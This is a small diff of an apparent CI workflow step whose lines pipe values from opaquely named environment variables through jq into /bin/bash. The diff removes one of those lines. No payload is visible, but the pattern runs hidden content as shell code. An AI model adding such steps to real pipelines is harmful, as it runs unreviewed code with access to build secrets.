@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$tv2537" | jq -r .vm6115 | /bin/bash
           echo $tmtfv8964 | jq -r .m8878 | /bin/bash
-          echo $ujn9388 | jq -r .cwo110 | /bin/bash
           echo $wf9 | jq -r .dajen634 | /bin/bash
           echo $rwbv47857 | jq -r .cgqr8854 | /bin/bash
 
